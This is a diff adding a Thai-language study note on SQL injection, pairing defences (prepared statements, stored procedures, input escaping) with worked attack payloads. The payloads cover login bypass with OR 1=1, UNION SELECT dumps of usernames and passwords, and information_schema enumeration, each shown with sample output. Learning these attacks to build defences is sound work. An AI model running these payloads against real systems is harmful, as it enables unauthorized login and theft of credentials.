@@ -1,0 +1,76 @@
+จะเห็นได้ว่าสาเหตุหลักของช่องโหว่ประเภท SQL Injection 
+นั้นเกิดจากการที่เว็บแอปพลิเคชันนำข้อมูลที่ได้รับมาจากผู้ใช้งานมาสร้าง SQL query 
+โดยไม่ได้ทำการตรวจสอบก่อนว่าข้อมูลนั้นมีความถูกต้องเหมาะสมหรือไม่ 
+ดังนั้นวิธีการป้องกัน SQL Injection ก็ต้องเริ่มต้นที่การตรวจสอบข้อมูลที่ได้รับมาจากผู้ใช้งาน
+
+1.prepared statement 
+เป็นการระบุให้กับเว็บแอปพลิเคชันรู้ก่อนว่า ข้อมูลที่ได้รับจากผู้ใช้งานนั้นเป็น string 
+ทั้งหมดและไม่ให้นำข้อมูลที่เป็น string เหล่านี้ไปประมวลผลในรูปแบบของ SQL statement 
+ดังนั้นโปรแกรมนี้จึงไม่มีช่องโหว่ประเภท SQL Injection
+
+ขั้นตอนนี้มีความสำคัญต่อทั้งความปลอดภัยและความสมบูรณ์ของข้อมูล 
+ช่วยป้องกันการโจมตีการฉีด SQL โดยทำให้แน่ใจว่าพารามิเตอร์นั้นถือเป็นค่า 
+แทนที่จะเป็น executable code นอกจากนี้ยังช่วยให้ฐานข้อมูลจัดการพารามิเตอร์ได้อย่างถูกต้องตามประเภทข้อมูล 
+หลีกเลี่ยงปัญหาที่อาจเกิดขึ้นกับประเภทข้อมูลไม่ตรงกันหรือข้อผิดพลาดในการจัดรูปแบบ
+
+2.Stored Procedure 
+โดย Stored Procedure จะเก็บ SQL query 
+ไว้ที่ฐานข้อมูลและให้เว็บแอปพลิเคชันส่ง parameter 
+มาให้ฐานข้อมูลเรียก SQL query ที่เก็บไว้มาทำงาน 
+แทนที่เว็บแอปพลิเคชันจะเป็นผู้สร้าง SQL query แล้วส่งไปให้กับฐานข้อมูล
+
+3.Escaping User Input 
+ด้วยการตรวจสอบข้อมูลที่ได้รับมาจากผู้ใช้งาน แก้ไข หรือ ลบ 
+ข้อมูลที่อาจจะเป็นอันตรายออกก่อนที่จะนำไปสร้างเป็น SQL query 
+หากเราลองสังเกตรูปแบบการโจมตีด้วย SQL Injection อักขระพิเศษ
+เช่น ‘ (single quote) หรือ ” (double quote) 
+คือตัวการสำคัญในการพยายามดัดแปลง SQL query 
+(นอกจากนี้ยังมี # — และ keyword อื่น ๆ เช่น AND OR)
+ดังนั้นหากเราสามารถที่จะกรองเครื่องหมายเหล่านี้ออกไปก่อนที่จะนำข้อมูลจากผู้ใช้งานไปสร้างเป็น 
+SQL query ก็จะช่วยป้องกัน SQL Injection ได้มากขึ้น
+
+# bypass login
+1 'OR 1=1#    '
+SELECT * FROM users WHERE username = '$username' AND password = '$password'
+
+# bypass password
+username admin
+password 'OR 1=1#
+'
+SELECT * FROM users WHERE username=‘admin’ and password=‘’ OR ‘1’=‘1’;
+ผลลัพธ์ที่ได้ คือ แฮ็คเกอร์สามารถลงชื่อเข้าใช้เป็น “admin” ได้ทันที 
+เนื่องจากด้านหลังมีนิพจน์ OR 1=1 ทำให้คำสั่ง SQL ดังกล่าวเป็นจริงเสมอ
+
+
+select and unioun
+
+1 OR 1=1
+มันจะเป็น SELECT id, username FROM users WHERE id = 1 OR 1=1
+ผลลัพธ์:
+ID: 1 - Username: john_doe
+ID: 2 - Username: test1
+ID: 3 - Username: test2
+ID: 4 - Username: test3
+
+1 UNION SELECT username, password FROM users
+มันจะเป็น SELECT id, username FROM users WHERE id = 1 UNION SELECT username, password FROM users
+ผลลัพธ์:
+ID: john_doe - Username: password123
+ID: test1 - Username: $2y$10$RmjvSOjuXJQgy6eEARW8quv2ObgiEN5UIpbf.H3pv1E
+ID: test2 - Username: Awd234523
+ID: test3 - Username: test3
+
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+> มันจะเป็น SELECT id, username FROM users WHERE id = 1 UNION SELECT table_name, column_name FROM information_schema.columns
+ผลลัพธ์:
+ID: users - Username: id
+ID: users - Username: username
+ID: users - Username: password
+ID: users - Username: created_at
+ID: messages - Username: id
+ID: messages - Username: user_id
+ID: messages - Username: message
+ID: messages - Username: created_at
+ID: users - Username: email
+
